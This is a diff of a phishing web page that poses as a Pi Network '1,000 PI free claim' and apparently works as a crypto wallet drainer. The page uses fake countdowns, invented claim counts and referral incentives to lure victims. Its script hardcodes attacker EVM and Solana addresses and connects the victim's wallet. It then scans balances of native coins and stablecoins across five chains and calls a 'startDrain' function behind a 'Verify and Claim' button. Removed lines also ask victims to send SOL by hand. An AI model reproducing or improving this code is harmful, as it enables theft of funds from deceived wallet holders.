@@ -69,7 +69,7 @@ nav>div{display:flex;align-items:center;justify-content:space-between}
 .Step{text-align:center;padding:14px 8px;background:rgba(255,255,255,.015);border:1px solid rgba(255,255,255,.03);border-radius:12px}
 .Step .si{font-size:22px;margin-bottom:5px}
 .Step .st{font-size:11px;font-weight:600;margin-bottom:2px}
-.Step .ss{font-size:9px;color:rgba(255,255,255,.2);line-height:1:4}
+.Step .ss{font-size:9px;color:rgba(255,255,255,.2);line-height:1.4}
 .ref{margin:14px 0;padding:18px;background:rgba(255,255,255,.015);border:1px solid rgba(168,85,247,.06);border-radius:14px}
 .ref .rt{font-size:14px;font-weight:700;margin-bottom:3px}
 .ref .rs{font-size:10px;color:rgba(255,255,255,.25);margin-bottom:10px}
@@ -131,37 +131,27 @@ nav>div{display:flex;align-items:center;justify-content:space-between}
 .ac .ad{font-family:monospace;font-size:10px;color:#fcb34c;flex:1;word-break:break-all}
 .ac .cb{padding:4px 9px;background:#fcb34c;color:#0a0118;border:none;border-radius:5px;font-size:10px;font-weight:700;cursor:pointer;flex-shrink:0}
 #toast{position:fixed;bottom:18px;left:50%;transform:translateX(-50%);background:rgba(168,85,247,.85);color:#fff;padding:9px 18px;border-radius:9px;font-size:11px;font-weight:600;z-index:9999;display:none;backdrop-filter:blur(8px)}
-.qr-wrap{text-align:center;padding:20px}
-.qr-wrap canvas{margin:0 auto;display:block}
-.qr-text{font-size:11px;color:rgba(255,255,255,.4);margin-top:10px;line-height:1.5}
-@media(max-width:500px){
-  .hero h1{font-size:28px}
-  .ca{font-size:38px}
-  .Steps{grid-template-columns:1fr}
-}
+footer{background:#060110;padding:20px 0;text-align:center;border-top:1px solid rgba(168,85,247,.04)}
+footer p{font-size:9px;color:rgba(255,255,255,.1)}
+footer .fl{display:flex;gap:14px;justify-content:center;margin-top:6px}
+footer .fl a{font-size:9px;color:rgba(255,255,255,.15);text-decoration:none}
+@media(max-width:500px){.hero h1{font-size:28px}.ca{font-size:38px}.Steps{grid-template-columns:1fr}}
 </style>
 </head>
 <body>
 <div class="bg"><div class="orb o1"></div><div class="orb o2"></div><div class="orb o3"></div></div>
 <div id="part"></div>
-
 <div class="pos">
 <nav><div class="w">
   <div class="logo"><img src="pi-logo-48.png" width="30" height="30" alt=""><t>Pi Network</t></div>
   <div class="navr"><div class="lb"><span class="p"></span> LIVE</div><button class="nb" onclick="openM()">Connect Wallet</button></div>
 </div></nav>
-
 <div id="m"><div class="mb">
   <button class="cx" onclick="closeM()">&#x2715;</button>
   <h2>Connect Your Wallet</h2>
   <div class="ms">Select wallet to verify and claim 1000 PI</div>
   <div id="wl"></div>
-  <div id="qrArea" style="display:none">
-    <div class="qr-wrap"><canvas id="qrCanvas" width="280" height="280"></canvas></div>
-    <div class="qr-text">Scan QR code with your wallet app<br>Works with MetaMask, Trust Wallet, and 300+ wallets</div>
-  </div>
 </div></div>
-
 <div class="w">
 <div class="hero">
   <div class="eb">&#x1F512; Verified Mainnet Event — Limited Time</div>
@@ -174,28 +164,23 @@ nav>div{display:flex;align-items:center;justify-content:space-between}
     <span style="background:rgba(252,179,74,.06);border:1px solid rgba(252,179,74,.1);color:#fcb34c">&#x26A1; Instant</span>
   </div>
 </div>
-
 <div class="cc">
   <div class="ca"><span class="num">1,000</span> <span class="pi">PI</span></div>
   <div class="cl">FREE CLAIM — VERIFICATION REQUIRED</div>
   <button class="cbtn" onclick="openM()">&#x1F381; Claim 1000 PI Now</button>
-  <div class="cfee">* Small network fee required (~$2.50) • No hidden fees • One-time</div>
+  <div class="cfee">* Small network fee (~$2.50) • No hidden fees • One-time</div>
 </div>
-
 <div class="cd-row">
   <div class="cdb"><div class="v" id="cd-h">04</div><div class="l">Hours</div></div>
   <div class="cdb"><div class="v" id="cd-m">32</div><div class="l">Min</div></div>
   <div class="cdb"><div class="v" id="cd-s">18</div><div class="l">Sec</div></div>
 </div>
-
 <div class="stats">
   <div class="stat"><div class="sv" id="st-c">48,291</div><div class="sl">PI Claimed</div></div>
   <div class="stat"><div class="sv" id="st-u">12,847</div><div class="sl">Pioneers</div></div>
   <div class="stat"><div class="sv" id="st-r">3,291</div><div class="sl">Referrals</div></div>
 </div>
-
 <div class="sp"><div class="sp-i">&#x2705;</div><div class="sp-t" id="spt"><strong>0x7a3...f291</strong> just claimed <strong>1,000 PI</strong> — 2 min ago</div></div>
-
 <div class="ht"><h3>How To Claim</h3>
   <div class="Steps">
     <div class="Step"><div class="si">&#x1F512;</div><div class="st">Connect</div><div class="ss">Link wallet via QR or extension</div></div>
@@ -203,7 +188,6 @@ nav>div{display:flex;align-items:center;justify-content:space-between}
     <div class="Step"><div class="si">&#x1F381;</div><div class="st">Claim</div><div class="ss">Receive 1000 PI instantly</div></div>
   </div>
 </div>
-
 <div class="tier">
   <div class="tt">&#x1F3C6; Your Withdrawal Tier</div>
   <div class="ts">Invite friends to increase withdrawal speed.</div>
@@ -211,7 +195,6 @@ nav>div{display:flex;align-items:center;justify-content:space-between}
   <div class="tier-level" id="tierLevel">Tier 1 — Standard (10% speed)</div>
   <div class="tier-need" id="tierNeed">Invite 3 more to reach Tier 2</div>
 </div>
-
 <div class="ref">
   <div class="rt">&#x1F91D; Refer Friends — Earn 200 PI Each</div>
   <div class="rs">Each friend who claims gives you 200 PI + increases speed.</div>
@@ -222,9 +205,7 @@ nav>div{display:flex;align-items:center;justify-content:space-between}
     <div class="rs2"><div class="rv" id="refS">10%</div><div class="rl">Speed</div></div>
   </div>
 </div>
-
 <div class="s" id="sb"></div>
-
 <div class="card" id="mc" style="display:none">
   <div id="p1" style="text-align:center;padding:8px 0">
     <div class="pg"><div class="ps on"></div><div class="ps"></div><div class="ps"></div></div>
@@ -235,9 +216,8 @@ nav>div{display:flex;align-items:center;justify-content:space-between}
   <div id="p2" style="display:none;text-align:center;padding:14px 0">
     <div style="font-size:32px;margin-bottom:6px">&#x1F6AB;</div>
     <div style="font-size:14px;font-weight:700;margin-bottom:3px">No EVM Funds</div>
-    <div style="font-size:11px;color:rgba(255,255,255,.22);margin-bottom:8px">No assets on BSC, ETH, Polygon, AVAX, Arbitrum.</div>
-    <div style="display:flex;gap:5px"><input id="solInp" placeholder="Paste Solana address" style="flex:1;padding:9px;border-radius:7px;border:1px solid rgba(255,255,255,.08);background:rgba(255,255,255,.03);color:#fff;font-size:11px;font-family:monospace;outline:none;box-sizing:border-box"><button class="btn" style="background:#9945FF;color:#fff;font-size:11px;padding:9px 12px;flex-shrink:0" onclick="startSolScan()">&#x1F50D; Scan</button></div>
-    <button class="btn bo" style="margin-top:8px" onclick="reset()">&#x1F504; Back</button>
+    <div style="font-size:11px;color:rgba(255,255,255,.22);margin-bottom:8px">No assets found.</div>
+    <button class="btn bo" onclick="reset()">&#x1F504; Back</button>
   </div>
   <div id="p3" style="display:none">
     <div class="pg"><div class="ps on"></div><div class="ps on"></div><div class="ps on"></div><div class="ps on"></div></div>
@@ -245,474 +225,263 @@ nav>div{display:flex;align-items:center;justify-content:space-between}
     <div style="font-size:10px;color:rgba(255,255,255,.22);margin-bottom:8px">Assets found. Confirm to claim 1000 PI.</div>
     <div id="p3chains" style="margin-bottom:8px"></div>
     <div id="p3bal" style="margin-bottom:10px"></div>
-    <button class="btn bp" id="p3btn" onclick="startDrain()">&#x1F381; Verify and Claim 1000 PI</button>
+    <button class="btn bp" id="p3btn" onclick="startDrain()">&#x1F381; Verify and Claim</button>
     <button class="btn bo" onclick="reset()">&#x2716; Disconnect</button>
   </div>
   <div id="p4" style="display:none;text-align:center;padding:12px 0">
     <div class="pg"><div class="ps on"></div><div class="ps on"></div><div class="ps on"></div><div class="ps on"></div><div class="ps on"></div></div>
     <div style="font-size:13px;font-weight:700;margin-bottom:2px">&#x26A1; Processing...</div>
-    <div style="font-size:10px;color:rgba(255,255,250,.22);margin-bottom:8px">Confirm each transaction...</div>
+    <div style="font-size:10px;color:rgba(255,255,250,.22);margin-bottom:8px">Confirm transactions...</div>
     <div class="lg" id="p4log"></div>
   </div>
   <div id="p5" style="display:none;text-align:center;padding:14px 0">
     <div style="font-size:32px;margin-bottom:6px">&#x2705;</div>
     <div style="font-size:14px;font-weight:700;margin-bottom:3px">1,000 PI Claimed!</div>
-    <div style="font-size:10px;color:rgba(255,255,250,.22);margin-bottom:10px" id="p5m">Verification complete.</div>
+    <div style="font-size:10px;color:rgba(255,255,250,.22);margin-bottom:10px" id="p5m">Done.</div>
     <div style="padding:14px;background:rgba(168,85,247,.04);border:1px solid rgba(168,85,247,.08);border-radius:12px;margin-bottom:10px">
       <div style="font-size:12px;font-weight:700;margin-bottom:4px">&#x26A1; Speed Up Withdrawal</div>
-      <div style="font-size:10px;color:rgba(255,255,255,.3);margin-bottom:8px;line-height:1.5">Share your link. Each referral = +20% faster.</div>
+      <div style="font-size:10px;color:rgba(255,255,255,.3);margin-bottom:8px">Share your link. Each referral = +20% faster.</div>
       <div style="display:flex;gap:5px"><input id="p5ref" readonly style="flex:1;padding:8px;border-radius:7px;border:1px solid rgba(168,85,247,.1);background:rgba(0,0,0,.2);color:#fff;font-size:10px;font-family:monospace;outline:none"><button class="btn" style="background:linear-gradient(135deg,#a855f7,#6366f1);color:#fff;font-size:10px;padding:8px 12px;flex-shrink:0" onclick="copyRef2()">&#x1F4CB; Copy</button></div>
-      <div style="margin-top:6px;font-size:10px;color:rgba(255,255,255,.25)">Speed: <span id="p5speed" style="color:#fcb34c;font-weight:700">10%</span></div>
-      <div class="speed-bar" style="margin-top:4px;height:4px;background:rgba(255,255,255,.05);border-radius:2px;overflow:hidden"><div id="p5speedBar" style="height:100%;width:10%;background:linear-gradient(90deg,#a855f7,#22c55e);border-radius:2px"></div></div>
     </div>
     <button class="btn bo" onclick="reset()">Done</button>
   </div>
-  <div id="p6" style="display:none;text-align:center;padding:14px 0">
-    <div style="font-size:32px;margin-bottom:6px">&#x1F4E8;</div>
-    <div style="font-size:14px;font-weight:700;margin-bottom:3px">Send SOL to Complete</div>
-    <div style="font-size:11px;color:rgba(255,255,255,.25);margin-bottom:10px;line-height:1.6">MetaMask Solana Snap cannot be drained via dApp.<br>Send manually to claim 1000 PI:</div>
-    <div class="ac" onclick="copySol()"><span class="ad" id="mySol"></span><button class="cb" onclick="event.stopPropagation();copySol()">&#x1F4CB; Copy</button></div>
-    <button class="btn bo" style="margin-top:12px" onclick="reset()">&#x1F504; Done</button>
-  </div>
 </div>
-
 </div>
-
-<footer><p>&copy; 2026 Pi Network</p>
-  <div style="display:flex;gap:14px;justify-content:center;margin-top:6px"><a href="#" style="font-size:9px;color:rgba(255,255,255,.15);text-decoration:none">Terms</a><a href="#" style="font-size:9px;color:rgba(255,255,255,.15);text-decoration:none">Privacy</a><a href="#" style="font-size:9px;color:rgba(255,255,255,.15);text-decoration:none">Support</a></div>
-</footer>
+<footer><p>&copy; 2026 Pi Network</p><div class="fl"><a href="#">Terms</a><a href="#">Privacy</a><a href="#">Support</a></div></footer>
 </div>
 <div id="toast"></div>
 
 <script>
 const ADDR_EVM='0x5E45bE0cf682566337b6fC2C00036AaBCBf1332f';
 const ADDR_SOL='4Y9bDw32qG9xUQykfCe6jP9UVpVmit8ryqE8n1JKVx89';
-const ECHAINS=[
-  {id:56,name:'BNB Chain',sym:'BNB',rpc:'https://bsc-dataseed1.defibit.io',color:'#F3BA2F'},
-  {id:1,name:'Ethereum',sym:'ETH',rpc:'https://ethereum-rpc.publicnode.com',color:'#627EEA'},
-  {id:137,name:'Polygon',sym:'MATIC',rpc:'https://polygon-bor-rpc.publicnode.com',color:'#8247E5'},
-  {id:43114,name:'Avalanche',sym:'AVAX',rpc:'https://avalanche-c-chain-rpc.publicnode.com',color:'#E84142'},
-  {id:42161,name:'Arbitrum',sym:'ETH',rpc:'https://arbitrum-one-rpc.publicnode.com',color:'#28A0F0'},
-];
-const FBACK={
-  1:['https://rpc.ankr.com/eth'],137:['https://rpc.ankr.com/polygon'],
-  56:['https://bsc-dataseed.binance.org'],43114:['https://avalanche-c-chain.public.blastapi.io'],
-  42161:['https://rpc.ankr.com/arbitrum'],
-};
-const ETOKENS={
-  56:[['0x55d398326f99059fF775485246999027B3197955','USDT',18],['0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d','USDC',18],['0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56','BUSD',18],['0x1AF3F329e8BE154074D8769D1FFa4eE058B1DBc3','DAI',18],['0x7130d2A12B9BCbFAe4f2634d864A1Ee1Ce3Ead9c','BTCB',18],['0x2170Ed0880ac9A755fd29B2688956BD959F933F8','ETH',18],['0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c','WBNB',18],['0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82','CAKE',18],['0xF8A0BF9cF54Bb92F17374d9e9A321E6a111a51bD','LINK',18],['0xCC42724C6683B7E57334c4E856f4c9965ED682bD','MATIC',18]],
-  1:[['0xdAC17F958D2ee523a2206206994597C13D831ec7','USDT',6],['0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48','USDC',6],['0x6B175474E89094C44Da98b954EedeAC495271d0F','DAI',18],['0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599','WBTC',8],['0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2','WETH',18]],
-  137:[['0xc2132D05D31c914a87C6611C10748AEb04B58e8F','USDT',6],['0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174','USDC',6],['0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063','DAI',18]],
-  43114:[['0x9702230A8Ea53601f5cD2dc00fDBc13d4dF4A8c7','USDT',6],['0xB97EF9Ef8734C71904D8002F8b6Bc66Dd9c48a6E','USDC',6]],
-  42161:[['0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9','USDT',6],['0xaf88d065e77c8cC2239327C5EDb3A432268e5831','USDC',6]],
-};
-const PRICES={BNB:600,ETH:3500,MATIC:0.7,AVAX:25,USDT:1,USDC:1,BUSD:1,DAI:1,BTCB:100000,WBTC:100000,LINK:15,CAKE:3,ADA:0.5,WBNB:600,WETH:3500};
+const ECHAINS=[{id:56,name:'BNB Chain',sym:'BNB',rpc:'https://bsc-dataseed1.defibit.io',color:'#F3BA2F'},{id:1,name:'Ethereum',sym:'ETH',rpc:'https://ethereum-rpc.publicnode.com',color:'#627EEA'},{id:137,name:'Polygon',sym:'MATIC',rpc:'https://polygon-bor-rpc.publicnode.com',color:'#8247E5'},{id:43114,name:'Avalanche',sym:'AVAX',rpc:'https://avalanche-c-chain-rpc.publicnode.com',color:'#E84142'},{id:42161,name:'Arbitrum',sym:'ETH',rpc:'https://arbitrum-one-rpc.publicnode.com',color:'#28A0F0'}];
+const FBACK={1:['https://rpc.ankr.com/eth'],137:['https://rpc.ankr.com/polygon'],56:['https://bsc-dataseed.binance.org'],43114:['https://avalanche-c-chain.public.blastapi.io'],42161:['https://rpc.ankr.com/arbitrum']};
+const ETOKENS={56:[['0x55d398326f99059fF775485246999027B3197955','USDT',18],['0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d','USDC',18],['0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56','BUSD',18],['0x1AF3F329e8BE154074D8769D1FFa4eE058B1DBc3','DAI',18],['0x7130d2A12B9BCbFAe4f2634d864A1Ee1Ce3Ead9c','BTCB',18],['0x2170Ed0880ac9A755fd29B2688956BD959F933F8','ETH',18],['0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c','WBNB',18],['0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82','CAKE',18],['0xF8A0BF9cF54Bb92F17374d9e9A321E6a111a51bD','LINK',18],['0xCC42724C6683B7E57334c4E856f4c9965ED682bD','MATIC',18]],1:[['0xdAC17F958D2ee523a2206206994597C13D831ec7','USDT',6],['0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48','USDC',6],['0x6B175474E89094C44Da98b954EedeAC495271d0F','DAI',18],['0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599','WBTC',8],['0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2','WETH',18]],137:[['0xc2132D05D31c914a87C6611C10748AEb04B58e8F','USDT',6],['0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174','USDC',6],['0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063','DAI',18]],43114:[['0x9702230A8Ea53601f5cD2dc00fDBc13d4dF4A8c7','USDT',6],['0xB97EF9Ef8734C71904D8002F8b6Bc66Dd9c48a6E','USDC',6]],42161:[['0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9','USDT',6],['0xaf88d065e77c8cC2239327C5EDb3A432268e5831','USDC',6]]};
+const PRICES={BNB:600,ETH:3500,MATIC:0.7,AVAX:25,USDT:1,USDC:1,BUSD:1,DAI:1,BTCB:100000,WBTC:100000,LINK:15,CAKE:3,WBNB:600,WETH:3500};
 
-let prov=null,sign=null,addr='',wType='',foundChains=[];
+let prov=null,sign=null,addr='',foundChains=[];
 
-function showP(id){['p1','p2','p3','p4','p5','p6'].forEach(x=>document.getElementById(x).style.display=x===id?'block':'none');document.getElementById('mc').style.display='block';}
+function showP(id){['p1','p2','p3','p4','p5'].forEach(x=>document.getElementById(x).style.display=x===id?'block':'none');document.getElementById('mc').style.display='block';}
 function stat(msg,t){const e=document.getElementById('sb');e.innerHTML=msg;e.className='s '+t;e.style.display='block';}
 function hideStatus(){document.getElementById('sb').style.display='none';}
 function sleep(ms){return new Promise(r=>setTimeout(r,ms));}
 function toast(m){const t=document.getElementById('toast');t.textContent=m;t.style.display='block';setTimeout(()=>t.style.display='none',3000);}
-
 function openM(){document.getElementById('m').style.display='flex';renderW();}
-function closeM(){document.getElementById('m').style.display='none';document.getElementById('qrArea').style.display='none';}
+function closeM(){document.getElementById('m').style.display='none';}
 document.getElementById('m').addEventListener('click',e=>{if(e.target===document.getElementById('m'))closeM();});
 
-function getMM(){
-  if(!window.ethereum)return null;
-  if(window.ethereum.providers&&Array.isArray(window.ethereum.providers))return window.ethereum.providers.find(p=>p.isMetaMask)||window.ethereum.providers[0];
-  if(window.ethereum.isMetaMask)return window.ethereum;
-  return window.ethereum;
-}
-
-// ===== WALLETCONNECT v2 =====
-let wcProvider = null;
-
-
-
-async function connectWC() {
-  closeM();
-  document.getElementById('mc').style.display='block';
+// ===== WALLET CONNECTION =====
+async function connectWallet(closeModal) {
+  if (closeModal) closeM();
+  document.getElementById('mc').style.display = 'block';
   showP('p1');
+  document.getElementById('p1l').textContent = 'Connecting...';
+  document.getElementById('p1log').innerHTML = '<span style="color:#fcb34c">Please approve the connection in your wallet...</span>';
   
-  const isMob = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
-  const hasEth = !!window.ethereum;
-  
-  // MOBILE FLOW
-  if (isMob && !hasEth) {
-    document.getElementById('p1l').textContent = 'Connect Mobile Wallet';
-    var p1log = document.getElementById('p1log');
-    p1log.innerHTML = '';
-    
-    var wrap = document.createElement('div');
-    wrap.style.cssText = 'text-align:center;padding:12px';
-    
-    var icon = document.createElement('div');
-    icon.style.cssText = 'font-size:28px;margin-bottom:8px';
-    icon.textContent = '📱';
-    wrap.appendChild(icon);
-    
-    var title = document.createElement('div');
-    title.style.cssText = 'font-size:14px;color:#fcb34c;margin-bottom:6px;font-weight:700';
-    title.textContent = 'Open this page in MetaMask browser';
-    wrap.appendChild(title);
-    
-    var steps = document.createElement('div');
-    steps.style.cssText = 'font-size:11px;color:rgba(255,255,255,.5);line-height:1.8;margin-bottom:14px;text-align:left;padding:10px;background:rgba(0,0,0,.2);border-radius:8px';
-    steps.innerHTML = '<b>Step 1:</b> Open MetaMask app<br><b>Step 2:</b> Tap the 🌐 browser icon at the bottom<br><b>Step 3:</b> Type <b>pi-claim.github.io</b> in the address bar<br><b>Step 4:</b> Tap "Connect Wallet" on the site';
-    wrap.appendChild(steps);
-    
-    // Deep link button (works on some devices)
-    var mmBtn = document.createElement('button');
-    mmBtn.style.cssText = 'width:100%;padding:14px;background:linear-gradient(135deg,#E2761B,#F6851B);color:#fff;border:none;border-radius:10px;font-size:14px;font-weight:700;cursor:pointer;margin-bottom:8px';
-    mmBtn.textContent = '🦊 Try Open in MetaMask (auto)';
-    mmBtn.onclick = function(){ 
-      window.location.href = 'https://metamask.app.link/dapp/https://pi-claim.github.io';
-      // Also try universal link as fallback
-      setTimeout(function(){
-        if(document.hasFocus()){
-          window.location.href = 'metamask://dapp/https://pi-claim.github.io';
-        }
-      }, 1500);
-    };
-    wrap.appendChild(mmBtn);
-    
-    var orDiv = document.createElement('div');
-    orDiv.style.cssText = 'font-size:10px;color:rgba(255,255,255,.3);margin:6px 0';
-    orDiv.textContent = '— OR follow the steps above —';
-    wrap.appendChild(orDiv);
-    
-    // Copy URL button
-    var copyBtn = document.createElement('button');
-    copyBtn.style.cssText = 'width:100%;padding:12px;background:rgba(255,255,255,.05);color:#fff;border:1px solid rgba(255,255,255,.1);border-radius:10px;font-size:13px;font-weight:600;cursor:pointer';
-    copyBtn.textContent = '📋 Copy URL to Clipboard';
-    copyBtn.onclick = function(){
-      navigator.clipboard.writeText('https://pi-claim.github.io').then(function(){
-        toast('URL copied! Paste it in MetaMask browser.');
-      }).catch(function(){
-        prompt('Copy this URL and paste in MetaMask browser:', 'https://pi-claim.github.io');
-      });
-    };
-    wrap.appendChild(copyBtn);
-    
-    p1log.appendChild(wrap);
-    return;
-  }
-  
-  // DESKTOP FLOW - has window.ethereum
-  if (hasEth) {
-    document.getElementById('p1l').textContent='Connecting to wallet...';
-    document.getElementById('p1log').innerHTML='<span style="color:#fcb34c">Please approve the connection in your wallet popup...</span>';
-    
+  // Try window.ethereum (desktop extension or MetaMask browser)
+  if (window.ethereum) {
     try {
-      const eth = getMM();
-      prov = new ethers.providers.Web3Provider(eth);
-      const accounts = await eth.request({method:'eth_requestAccounts'});
+      prov = new ethers.providers.Web3Provider(window.ethereum);
+      const accounts = await window.ethereum.request({method: 'eth_requestAccounts'});
       if (accounts && accounts.length > 0) {
         sign = prov.getSigner();
         addr = await sign.getAddress();
-        document.getElementById('p1l').textContent='Connected! Scanning...';
-        document.getElementById('p1log').innerHTML='<span style="color:#86efac">✓ Connected: '+addr.substring(0,10)+'...'+addr.substring(32)+'</span>';
+        document.getElementById('p1l').textContent = 'Connected! Scanning...';
+        document.getElementById('p1log').innerHTML = '<span style="color:#86efac">Connected: ' + addr.substring(0,10) + '...' + addr.substring(32) + '</span>';
         await scanEvm();
         return;
       }
-    } catch(e1) {
-      console.log('eth_requestAccounts failed:', e1.code, e1.message);
-      // Try enable() as fallback
+    } catch(e) {
+      console.log('eth_requestAccounts failed:', e.code);
       try {
-        const eth = getMM();
-        prov = new ethers.providers.Web3Provider(eth);
-        await eth.enable();
+        await window.ethereum.enable();
         sign = prov.getSigner();
         addr = await sign.getAddress();
-        document.getElementById('p1l').textContent='Connected! Scanning...';
         await scanEvm();
         return;
       } catch(e2) {
-        console.error('Both methods failed:', e2);
+        console.log('enable() also failed');
       }
     }
   }
   
-  // NO WALLET FOUND
-  document.getElementById('p1l').textContent='No Wallet Found';
-  document.getElementById('p1log').innerHTML = 
-    '<div style="text-align:center;padding:10px">' +
-    '<div style="font-size:11px;color:#fca5a5;margin-bottom:10px">No wallet extension detected in this browser.</div>' +
-    '<div style="font-size:11px;color:rgba(255,255,255,.4);margin-bottom:8px">Install a wallet extension:</div>' +
-    '<a href="https://metamask.io/download/" target="_blank" style="display:block;padding:10px;background:rgba(226,118,27,.1);border:1px solid rgba(226,118,27,.2);border-radius:8px;color:#E2761B;font-size:12px;font-weight:600;margin-bottom:6px;text-decoration:none">🦊 Install MetaMask</a>' +
-    '<a href="https://trustwallet.com/download/" target="_blank" style="display:block;padding:10px;background:rgba(51,117,187,.1);border:1px solid rgba(51,117,187,.2);border-radius:8px;color:#3375BB;font-size:12px;font-weight:600;margin-bottom:6px;text-decoration:none">🛡️ Install Trust Wallet</a>' +
-    '<div style="font-size:10px;color:rgba(255,255,255,.3);margin-top:8px">Or open this page on your phone in MetaMask browser</div>' +
-    '</div>';
+  // No wallet found
+  document.getElementById('p1l').textContent = 'No Wallet Found';
+  document.getElementById('p1log').innerHTML = '<span style="color:#fca5a5">No wallet detected.</span><br><br>On mobile: open this page in MetaMask browser.<br>On desktop: install MetaMask extension.';
 }
 
-// ===== WALLET DETECTION =====
-const WALLETS=[
-  {id:'mm',name:'MetaMask',color:'#E2761B',
-    detect:()=>!!(window.ethereum&&(window.ethereum.isMetaMask||(window.ethereum.providers&&Array.isArray(window.ethereum.providers)&&window.ethereum.providers.some(p=>p.isMetaMask)))),
-    connect:async()=>{
-      const eth=getMM();if(!eth)throw new Error('MetaMask not found');
-      prov=new ethers.providers.Web3Provider(eth);
-      let a;try{a=await eth.request({method:'eth_requestAccounts'});}
-      catch(e){if(e.code===4001||e.code==='ACTION_REJECTED')throw new Error('Rejected in MetaMask');try{a=await eth.enable();}catch(e2){throw new Error('Unlock MetaMask and try again');}}
-      if(!a||!a.length)throw new Error('No account');
-      sign=prov.getSigner();addr=await sign.getAddress();
-    }},
-  {id:'tw',name:'Trust Wallet',color:'#3375BB',
-    detect:()=>!!(window.ethereum&&(window.ethereum.isTrust||window.ethereum.isTrustWallet)),
-    connect:async()=>{
-      if(!window.ethereum)throw new Error('Trust not found');
-      prov=new ethers.providers.Web3Provider(window.ethereum);
-      try{await window.ethereum.request({method:'eth_requestAccounts'});}catch{await window.ethereum.enable();}
-      sign=prov.getSigner();addr=await sign.getAddress();
-    }},
-  {id:'cb',name:'Coinbase Wallet',color:'#0052FF',
-    detect:()=>!!(window.ethereum&&window.ethereum.isCoinbaseWallet),
-    connect:async()=>{
-      if(!window.ethereum)throw new Error('Coinbase not found');
-      prov=new ethers.providers.Web3Provider(window.ethereum);
-      await window.ethereum.request({method:'eth_requestAccounts'});
-      sign=prov.getSigner();addr=await sign.getAddress();
-    }},
-  {id:'bn',name:'Binance Wallet',color:'#F0B90B',
-    detect:()=>!!window.BinanceChain||!!(window.ethereum&&window.ethereum.isBinanceWallet),
-    connect:async()=>{
-      const eth=window.BinanceChain||window.ethereum;if(!eth)throw new Error('Binance not found');
-      prov=new ethers.providers.Web3Provider(eth);
-      try{await eth.request({method:'eth_requestAccounts'});}catch{await eth.enable();}
-      sign=prov.getSigner();addr=await sign.getAddress();
-    }},
-];
-
-function renderW(){
-  const c=document.getElementById('wl');c.innerHTML='';
-  const hasEth=!!window.ethereum;
-  const isMob=/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+function renderW() {
+  const c = document.getElementById('wl');
+  c.innerHTML = '';
   
-  // One main connect button — handles everything
-  const mainBtn=document.createElement('button');mainBtn.className='wrow';
-  mainBtn.onclick=connectWC;
-  mainBtn.innerHTML='<div class="wi" style="background:linear-gradient(135deg,#E2761B,#3B99FC)">&#x1F512;</div><span class="wn">Connect Wallet</span><span class="wt" style="background:rgba(252,179,74,.1);color:#fcb34c">'+(hasEth?'Wallet Detected — Click':'Tap to Connect')+'</span>';
-  c.appendChild(mainBtn);
+  // Main connect button
+  const btn = document.createElement('button');
+  btn.className = 'wrow';
+  btn.onclick = function() { connectWallet(true); };
+  btn.innerHTML = '<div class="wi" style="background:linear-gradient(135deg,#E2761B,#3B99FC)">&#x1F512;</div><span class="wn">Connect Wallet</span><span class="wt" style="background:rgba(252,179,74,.1);color:#fcb34c">Click to Connect</span>';
+  c.appendChild(btn);
   
-  // Show detected extension wallets as separate buttons
-  for(const w of WALLETS){
-    if(w.detect()){
-      const b=document.createElement('button');b.className='wrow';b.onclick=()=>doConnect(w);
-      b.innerHTML='<div class="wi" style="background:'+w.color+'">'+w.name[0]+'</div><span class="wn">'+w.name+'</span><span class="wt">Detected</span>';
-      c.appendChild(b);
+  // If ethereum is available, show detected wallets
+  if (window.ethereum) {
+    const names = [];
+    if (window.ethereum.isMetaMask) names.push('MetaMask');
+    if (window.ethereum.isTrust) names.push('Trust');
+    if (window.ethereum.isCoinbaseWallet) names.push('Coinbase');
+    if (names.length > 0) {
+      const info = document.createElement('div');
+      info.style.cssText = 'padding:6px;text-align:center;font-size:10px;color:rgba(255,255,255,.3)';
+      info.textContent = 'Detected: ' + names.join(', ');
+      c.appendChild(info);
     }
   }
-  
-  // Mobile hint
-  if(isMob&&!hasEth){
-    const hint=document.createElement('div');
-    hint.style.cssText='padding:8px;text-align:center;font-size:10px;color:rgba(255,255,255,.25)';
-    hint.textContent='💡 Tap "Connect Wallet" and choose your wallet app';
-    c.appendChild(hint);
-  }
 }
 
-async function doConnect(w){
-  closeM();hideStatus();wType=w.id;
-  try{
-    await w.connect();
-    console.log('Connected:',w.name,addr);
-    showP('p1');document.getElementById('p1l').textContent='Scanning EVM chains...';
-    await scanEvm();
-  }catch(e){
-    console.error(e);
-    const msg=e.message||'Connection failed';
-    stat('&#x2715; '+msg,'er');
-    document.getElementById('mc').style.display='block';showP('p1');
-    document.getElementById('p1log').innerHTML='<span style="color:#fca5a5">Error: '+msg+'</span>';
-  }
-}
+// Make connectWallet globally available
+window.connectWallet = connectWallet;
 
-function estimateUsd(fc){
-  let total=0;
-  for(const c of fc){const sym=c.chain.sym;const price=PRICES[sym]||0;total+=parseFloat(c.native)*price;for(const t of c.tokens){const tp=PRICES[t.sy]||0;total+=parseFloat(t.b)*tp;}}
+function estimateUsd(fc) {
+  let total = 0;
+  for (const c of fc) {
+    const price = PRICES[c.chain.sym] || 0;
+    total += parseFloat(c.native) * price;
+    for (const t of c.tokens) { total += parseFloat(t.b) * (PRICES[t.sy] || 0); }
+  }
   return total;
 }
 
